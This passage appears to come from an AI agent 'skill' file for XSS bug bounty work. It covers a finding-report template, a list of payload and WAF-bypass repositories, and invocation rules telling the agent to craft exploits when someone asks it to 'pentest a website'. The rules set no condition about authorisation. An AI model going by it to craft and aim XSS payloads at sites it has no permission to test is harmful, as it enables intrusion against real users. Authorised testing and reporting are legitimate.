[How the vulnerability works — what the app does with the input,
where it reflects, what context, and why the payload executes]

### Impact
[What an attacker can achieve with this vulnerability]

### Remediation
[Specific fix, not just "sanitize input"]

### Timeline
- [Date]: Found
- [Date]: Reported
- [Date]: Triaged
- [Date]: Fixed
- [Date]: Bounty paid
```

---

## 23. External Resources

| Resource | What It Provides |
|----------|-----------------|
| `https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet` | Authoritative XSS test cases |
| `https://github.com/ERO-HACK/bypassXSS` | 100+ bypass techniques with real cases |
| `https://github.com/gprime31/WAF-bypass-xss-payloads` | Cloudflare-specific payloads |
| `https://github.com/hahwul/dalfox` | Best-in-class XSS scanner |
| `https://github.com/kamalakantabhuyan/advanced-xss-playbook` | Structured payload collection |
| `https://xss.page/payloads` | 150 categorized payloads |
| `https://waf-bypass.com` | Latest WAF bypass techniques |

---

## 24. When To Invoke This Skill

**Use this skill when:**
- You see a web request/response and need to determine if XSS is possible
- You need to craft a payload for a specific context
- A WAF is blocking your standard payloads
- You're reviewing source code for XSS vulnerabilities
- You need to write up an XSS finding
- Someone asks you to "pentest a website" or "find XSS"

**Do NOT use this skill when:**
- You need to run automated mass scans (use Dalfox/Nuclei directly)
- The target has no web interface
- The task is about SQL injection, SSRF, or other vulnerability types (use appropriate skills)

---

## Summary

Context + sink decide execution. Encode for the exact context, verify at runtime with CSP/Trusted Types, and validate every alternative render path. Small payloads with strong evidence beat payload catalogs.

---

*This skill contains no tool execution commands. It provides reasoning frameworks
built from real-world bug bounty findings. The AI's value is in understanding
context, analyzing responses, and crafting targeted exploits — not running
scripts that anyone can run from a terminal.*
